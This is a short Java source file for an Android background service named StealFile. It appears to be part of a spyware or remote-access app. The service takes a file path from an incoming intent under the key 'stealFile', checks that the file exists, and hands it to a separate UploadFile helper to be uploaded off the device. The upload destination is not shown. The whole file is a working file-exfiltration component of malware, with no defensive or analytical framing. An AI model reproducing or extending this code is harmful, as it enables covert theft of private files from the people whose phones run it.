package com.coding4fun.services;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.coding4fun.utils.UploadFile;

import java.io.File;

/**
 * Created by coding4fun on 02-Nov-16.
 */

public class StealFile extends IntentService {

    public StealFile() {
        super("StealFile");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        String filePath = intent.getExtras().getString("stealFile");
        Log.e("GPA","filePath: " + filePath);
        File f = new File(filePath);
        if(f.exists()){
            if (UploadFile.uploadFile(this,filePath))
                Log.e("GPA","upload success");
            else
                Log.e("GPA","upload failed");
        } else
            Log.e("GPA","file does not exist");
    }
}